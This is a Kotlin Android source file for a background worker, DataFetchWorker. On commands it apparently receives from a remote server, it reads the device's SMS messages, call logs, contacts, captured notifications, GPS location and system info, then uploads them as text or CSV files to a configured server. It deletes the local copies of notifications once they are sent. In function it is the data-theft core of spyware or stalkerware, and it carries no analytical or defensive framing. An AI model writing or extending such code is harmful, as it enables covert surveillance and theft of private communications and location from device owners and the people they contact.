package com.example.lta

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.util.Log
import androidx.core.content.ContextCompat
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.tasks.await
import kotlinx.coroutines.withContext
import java.io.File

class DataFetchWorker(private val appContext: Context, workerParams: WorkerParameters) :
    CoroutineWorker(appContext, workerParams) {

    // Dependencies needed by the worker
    private val apiClient = ApiClient(appContext.getString(R.string.server_base_url))
    private val manualDataManager = ManualDataManager(appContext)
    private val systemInfoManager = SystemInfoManager(appContext)
    // Get an instance of our database DAO
    private val notificationDao = NotificationDatabase.getDatabase(appContext).notificationDao()

    companion object {
        const val KEY_COMMAND = "COMMAND"
        private const val TAG = "DataFetchWorker"
    }

    override suspend fun doWork(): Result {
        val command = inputData.getString(KEY_COMMAND)
        if (command == null) {
            Log.e(TAG, "Worker started without a command.")
            return Result.failure()
        }
        Log.d(TAG, "Executing command: $command")

        return withContext(Dispatchers.IO) {
            try {
                val success = when (command) {
                    "get_location" -> fetchAndSendLocation()
                    "get_system_info" -> fetchAndSendSystemInfo()
                    "get_call_logs" -> fetchAndSendCsv("CallLogs", manualDataManager::getCallLogsAsCsv)
                    "get_sms" -> fetchAndSendCsv("SMS", manualDataManager::getSmsAsCsv)
                    "get_contacts" -> fetchAndSendCsv("Contacts", manualDataManager::getContactsAsCsv)
                    "get_notifications" -> fetchAndSendNotificationsCsv() // The new command handler
                    else -> {
                        Log.w(TAG, "Unknown command: $command")
                        false
                    }
                }
                // If the task was successful, we're done. If not, WorkManager will retry it later.
                if (success) Result.success() else Result.retry()
            } catch (e: Exception) {
                Log.e(TAG, "Error executing command: $command", e)
                Result.failure()
            }
        }
    }

    /**
     * Fetches all saved notifications, sends them as a CSV, and deletes them from the local
     * database upon successful transmission.
     */
    private suspend fun fetchAndSendNotificationsCsv(): Boolean {
        // 1. Get all notifications from the database
        val unsentNotifications = notificationDao.getAllNotifications()

        // 2. If there's nothing to send, report it and finish successfully
        if (unsentNotifications.isEmpty()) {
            Log.d(TAG, "No new notifications to send.")
            return apiClient.uploadText("✅ No new notifications found on device.")
        }

        // 3. Generate the CSV data using the helper in ManualDataManager
        val csvData = manualDataManager.getNotificationsAsCsv(unsentNotifications)
        val file = File.createTempFile("notifications_", ".csv", appContext.cacheDir)
        file.writeText(csvData)

        // 4. Upload the file to the server
        Log.d(TAG, "Uploading ${unsentNotifications.size} notifications...")
        val success = apiClient.uploadFile(file, "Exported Notifications from Device")
        file.delete() // Clean up the temp file regardless of upload success

        // 5. If the upload was successful, delete the sent items from the local database
        if (success) {
            val idsToDelete = unsentNotifications.map { it.id }
            notificationDao.deleteByIds(idsToDelete)
            Log.d(TAG, "Successfully sent and deleted ${idsToDelete.size} notifications from DB.")
        } else {
            Log.e(TAG, "Failed to upload notifications CSV. They will remain in the DB for the next attempt.")
        }

        return success
    }

    private suspend fun fetchAndSendLocation(): Boolean {
        if (ContextCompat.checkSelfPermission(appContext, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "Location permission not granted.")
            apiClient.uploadText("📍 Location command failed: Permission not granted.")
            return false // Return false so the server knows the command failed
        }
        val fusedLocationClient = LocationServices.getFusedLocationProviderClient(appContext)
        // Use a balanced priority to conserve battery
        val location = fusedLocationClient.getCurrentLocation(Priority.PRIORITY_BALANCED_POWER_ACCURACY, null).await()
        return if (location != null) {
            val message = "📍 Location Update:\nLat: ${location.latitude}\nLon: ${location.longitude}\nAccuracy: ${location.accuracy}m"
            apiClient.uploadText(message)
        } else {
            apiClient.uploadText("📍 Location Update:\nFailed to get location (was null).")
            false
        }
    }

    private suspend fun fetchAndSendSystemInfo(): Boolean {
        val networkInfo = systemInfoManager.getNetworkInfo()
        val batteryInfo = systemInfoManager.getBatteryInfo()
        val systemInfoMessage = "⚙️ System Info:\nNetwork: $networkInfo\n$batteryInfo"
        return apiClient.uploadText(systemInfoMessage)
    }

    /**
     * A generic helper to handle creating and sending CSV files for data types
     * that can be generated on-demand.
     */
    private suspend fun fetchAndSendCsv(dataType: String, csvProvider: () -> String): Boolean {
        val csvData = csvProvider()
        if (csvData.lines().size <= 1) { // Check if only header + newline exists
            Log.d(TAG, "No data to export for $dataType")
            return apiClient.uploadText("Command failed: No $dataType data found on device.")
        }

        val file = File.createTempFile(dataType.lowercase(), ".csv", appContext.cacheDir)
        file.writeText(csvData)

        val success = apiClient.uploadFile(file, "Exported $dataType from device.")
        file.delete()
        return success
    }
}
